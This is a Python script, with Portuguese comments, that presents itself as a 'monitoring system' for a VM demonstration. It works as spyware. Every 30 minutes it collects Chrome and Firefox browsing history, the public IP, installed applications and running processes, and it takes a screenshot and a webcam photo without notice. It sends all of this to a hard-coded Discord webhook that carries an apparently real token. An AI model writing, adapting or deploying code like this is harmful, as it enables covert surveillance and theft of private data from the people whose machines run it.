import os
import time
import schedule
import requests
import sqlite3
import platform
import hashlib
import json
from datetime import datetime
from PIL import ImageGrab
import cv2
import psutil
import shutil
from cryptography.fernet import Fernet
import subprocess
import base64
from io import BytesIO

# --- Configurações ---
LOG_DIR = "logs_criptografados"
MAX_LOG_AGE_DAYS = 7
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1459232383445500128/UysW7g1xigRBIHf1nSv7sjyZL-U6mCW5PGSSNyG-Us5HW4KDhOw1JZLT7O_V-W97fzxS"  # Substitua pela sua URL
ENCRYPTION_KEY = Fernet.generate_key()  # Chave para criptografar logs

# --- Funções Auxiliares ---

def setup_encryption():
    """Configura a criptografia dos logs."""
    global cipher_suite
    cipher_suite = Fernet(ENCRYPTION_KEY)
    os.makedirs(LOG_DIR, exist_ok=True)

def encrypt_data(data: str) -> bytes:
    """Criptografa dados usando Fernet."""
    return cipher_suite.encrypt(data.encode())

def decrypt_data(encrypted_data: bytes) -> str:
    """Descriptografa dados criptografados."""
    return cipher_suite.decrypt(encrypted_data).decode()

def enviar_para_discord(titulo: str, descricao: str, anexos: list = None):
    """
    Envia uma mensagem para o Discord via webhook.
    Retorna True se sucesso, False se falha.
    """
    try:
        embed = {
            "embeds": [{
                "title": titulo,
                "description": descricao,
                "color": 3447003,  # Azul Discord
                "timestamp": datetime.utcnow().isoformat(),
            }]
        }

        if anexos:
            embed["files"] = anexos

        response = requests.post(
            DISCORD_WEBHOOK_URL,
            json=embed,
            headers={"Content-Type": "application/json"}
        )

        if response.status_code == 204:
            print("[+] ✅ Mensagem enviada para o Discord com sucesso!")
            return True
        else:
            print(f"[-] ❌ Falha ao enviar para Discord. Status: {response.status_code}")
            print(f"   Resposta: {response.text}")
            return False

    except Exception as e:
        print(f"[-] ❌ Erro ao enviar para Discord: {e}")
        return False

def capturar_tela(nome_arquivo="captura_tela.png"):
    """Captura a tela e salva como imagem."""
    try:
        tela = ImageGrab.grab()
        tela.save(nome_arquivo)
        print(f"[+] Tela capturada: {nome_arquivo}")
        return nome_arquivo
    except Exception as e:
        print(f"[-] Erro ao capturar tela: {e}")
        return None

def tirar_foto_camera(nome_arquivo="foto_camera.jpg", duracao=2):
    """Tira uma foto usando a câmera (OpenCV)."""
    try:
        cap = cv2.VideoCapture(0)
        time.sleep(duracao)  # Tempo para o usuário se posicionar
        ret, frame = cap.read()
        if ret:
            cv2.imwrite(nome_arquivo, frame)
            print(f"[+] Foto da câmera salva: {nome_arquivo}")
            cap.release()
            return nome_arquivo
        cap.release()
    except Exception as e:
        print(f"[-] Erro ao tirar foto: {e}")
        return None

def obter_historico_navegador():
    """Obtém histórico de múltiplos navegadores (Chrome, Firefox, Edge)."""
    sistema = platform.system()
    historico = []

    def get_chrome_history():
        """Obtém histórico do Chrome/Edge."""
        try:
            if sistema == "Windows":
                db_path = os.path.expanduser(
                    r"~\AppData\Local\Google\Chrome\User Data\Default\History"
                )
            elif sistema == "Linux":
                db_path = os.path.expanduser(
                    "~/.config/google-chrome/Default/History"
                )
            else:
                return []

            if os.path.exists(db_path):
                conn = sqlite3.connect(db_path)
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch') as visit_time
                    FROM urls
                    ORDER BY last_visit_time DESC
                    LIMIT 20;
                """)
                return cursor.fetchall()
            return []
        except Exception as e:
            print(f"[-] Erro ao obter histórico do Chrome: {e}")
            return []

    def get_firefox_history():
        """Obtém histórico do Firefox."""
        try:
            if sistema == "Windows":
                db_path = os.path.expanduser(
                    r"~\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
                )
            elif sistema == "Linux":
                db_path = os.path.expanduser(
                    "~/.mozilla/firefox/*.default-release/places.sqlite"
                )
            else:
                return []

            # Procura o primeiro arquivo places.sqlite encontrado
            for root, _, files in os.walk(os.path.expanduser("~")):
                if "places.sqlite" in files:
                    db_path = os.path.join(root, "places.sqlite")
                    break

            if os.path.exists(db_path):
                conn = sqlite3.connect(db_path)
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT url, title, datetime(visit_date/1000000, 'unixepoch') as visit_time
                    FROM moz_places
                    ORDER BY visit_date DESC
                    LIMIT 20;
                """)
                return cursor.fetchall()
            return []
        except Exception as e:
            print(f"[-] Erro ao obter histórico do Firefox: {e}")
            return []

    # Obtém histórico de Chrome/Edge e Firefox
    historico.extend(get_chrome_history())
    historico.extend(get_firefox_history())

    if not historico:
        print("[-] Nenhum histórico encontrado.")
    else:
        print("[+] Histórico do navegador obtido.")

    return historico

def obter_ip_publico():
    """Obtém o IP público da máquina."""
    try:
        response = requests.get("https://api.ipify.org?format=json")
        ip = response.json()["ip"]
        print(f"[+] IP público: {ip}")
        return ip
    except Exception as e:
        print(f"[-] Erro ao obter IP: {e}")
        return "Desconhecido"

def listar_apps_instaladas():
    """Lista apps instaladas (Windows/Linux)."""
    sistema = platform.system()
    apps = []

    if sistema == "Windows":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
            i = 0
            while True:
                try:
                    nome = winreg.EnumKey(key, i)
                    apps.append(nome)
                    i += 1
                except OSError:
                    break

            # Lista processos em execução (apps abertas)
            for proc in psutil.process_iter(['pid', 'name', 'exe']):
                try:
                    if proc.info['exe']:  # Ignora processos sem caminho (ex.: sistema)
                        apps.append(proc.info['name'])
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue

            print("[+] Apps instaladas (Windows) obtidas.")
        except Exception as e:
            print(f"[-] Erro ao listar apps (Windows): {e}")

    elif sistema == "Linux":
        try:
            # Lista pacotes instalados (Debian/Ubuntu)
            apps = os.popen("dpkg --list | grep -v '^ii' | awk '{print $2}'").read().splitlines()
            # Lista processos em execução
            for proc in psutil.process_iter(['pid', 'name', 'exe']):
                try:
                    if proc.info['exe']:
                        apps.append(proc.info['name'])
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue
            print("[+] Apps instaladas (Linux) obtidas.")
        except Exception as e:
            print(f"[-] Erro ao listar apps (Linux): {e}")

    return list(set(apps))  # Remove duplicatas

def detectar_mudancas_sistema(apps_anteriores):
    """Detecta novas apps instaladas desde a última execução."""
    apps_atuais = listar_apps_instaladas()
    novas_apps = [app for app in apps_atuais if app not in apps_anteriores]

    if novas_apps:
        print(f"[!] 🚨 Novas apps detectadas: {', '.join(novas_apps)}")
        return novas_apps
    else:
        print("[+] ✅ Nenhuma nova app detectada.")
        return []

def limpar_logs_antigos():
    """Apaga logs com mais de MAX_LOG_AGE_DAYS dias."""
    try:
        agora = time.time()
        limiar = agora - (MAX_LOG_AGE_DAYS * 24 * 60 * 60)

        for arquivo in os.listdir(LOG_DIR):
            caminho = os.path.join(LOG_DIR, arquivo)
            if os.path.getmtime(caminho) < limiar:
                os.remove(caminho)
                print(f"[*] 🗑️ Log antigo removido: {arquivo}")

        print(f"[+] ✅ Limpeza de logs concluída. Logs com mais de {MAX_LOG_AGE_DAYS} dias foram removidos.")
    except Exception as e:
        print(f"[-] ❌ Erro ao limpar logs: {e}")

def enviar_anexos_discord(arquivos):
    """Prepara anexos para envio ao Discord."""
    anexos = []
    for arquivo in arquivos:
        if os.path.exists(arquivo):
            with open(arquivo, "rb") as f:
                anexos.append({
                    "file": (os.path.basename(arquivo), f, "image/png" if arquivo.endswith(".png") else "image/jpeg")
                })
    return anexos

def salvar_logs(historico, ip, apps, apps_anteriores, novas_apps):
    """Salva os dados em um arquivo de log criptografado e envia notificação para Discord."""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        nome_arquivo = os.path.join(LOG_DIR, f"log_{timestamp}.enc")

        # Dados a serem salvos
        dados = {
            "timestamp": timestamp,
            "ip_publico": ip,
            "historico_navegador": historico,
            "apps_instaladas": apps,
            "apps_anteriores": apps_anteriores,
            "novas_apps": novas_apps,
        }

        # Criptografa e salva os dados
        dados_criptografados = encrypt_data(json.dumps(dados, indent=4))
        with open(nome_arquivo, "wb") as f:
            f.write(dados_criptografados)

        print(f"[+] 🔒 Log criptografado salvo: {nome_arquivo}")

        # --- Enviar notificação para Discord ---
        titulo = "🔍 **Monitoramento Executado**"
        descricao = f"""
        **Horário**: {timestamp}
        **IP Público**: {ip}
        **Apps Instaladas**: {len(apps)}
        """

        if novas_apps:
            descricao += f"""
            **⚠️ Novas Apps Detectadas**:
            {'\n'.join(f'- {app}' for app in novas_apps)}
            """
            titulo = "🚨 **NOVAS APPS INSTALADAS DETECTADAS**"

        # Captura tela e foto da câmera para anexar
        anexos = []
        tela_arquivo = capturar_tela(f"tela_{timestamp}.png")
        foto_arquivo = tirar_foto_camera(f"foto_{timestamp}.jpg", duracao=1)

        if tela_arquivo:
            anexos.append(("tela.png", open(tela_arquivo, "rb"), "image/png"))
            print(f"[+] 📸 Anexo de tela incluído: {tela_arquivo}")
        if foto_arquivo:
            anexos.append(("foto.jpg", open(foto_arquivo, "rb"), "image/jpeg"))
            print(f"[+] 📷 Anexo de foto incluído: {foto_arquivo}")

        # Envia a mensagem para o Discord
        sucesso = enviar_para_discord(titulo, descricao, anexos)

        if sucesso:
            print("[+] ✅ Notificação enviada para o Discord com sucesso!")
        else:
            print("[-] ❌ Falha ao enviar notificação para o Discord.")

        return nome_arquivo
    except Exception as e:
        print(f"[-] ❌ Erro ao salvar logs: {e}")
        return None

# --- Função Principal (Executa a cada 30 min) ---
def executar_monitoramento():
    print("\n" + "="*60)
    print(f"[+] 🕒 Executando monitoramento às {datetime.now().strftime('%H:%M:%S')}")
    print("="*60)

    # 1. Obter apps anteriores (para detectar mudanças)
    apps_anteriores = []
    if os.path.exists("apps_anteriores.json"):
        with open("apps_anteriores.json", "r") as f:
            apps_anteriores = json.load(f)

    # 2. Obter histórico do navegador
    historico = obter_historico_navegador()

    # 3. Obter IP público
    ip = obter_ip_publico()

    # 4. Listar apps instaladas
    apps_atuais = listar_apps_instaladas()

    # 5. Detectar mudanças no sistema (novas apps)
    novas_apps = detectar_mudancas_sistema(apps_anteriores)

    # 6. Salvar logs e enviar notificação para Discord
    salvar_logs(historico, ip, apps_atuais, apps_anteriores, novas_apps)

    # 7. Atualizar lista de apps anteriores para próxima execução
    with open("apps_anteriores.json", "w") as f:
        json.dump(apps_atuais, f)
    print("[+] ✅ Lista de apps atualizada para próxima execução.")

    # 8. Limpar logs antigos
    limpar_logs_antigos()

    print("[+] ✅ Monitoramento concluído.\n")

# --- Inicialização ---
if __name__ == "__main__":
    print("[+] 🛠️ Iniciando sistema de monitoramento em modo DEMONSTRAÇÃO (VM).")
    print("[!] ⚠️ ATENÇÃO: Este script captura dados sensíveis. Use apenas em um ambiente controlado.")

    # Configura criptografia
    setup_encryption()

    # Agendar execução a cada 30 minutos
    schedule.every(30).minutes.do(executar_monitoramento)

    # Executar imediatamente na primeira vez
    executar_monitoramento()

    # Loop infinito para manter o script rodando
    print("[+] 🔄 Aguardando próxima execução (a cada 30 minutos)...")
    while True:
        schedule.run_pending()
        time.sleep(1)
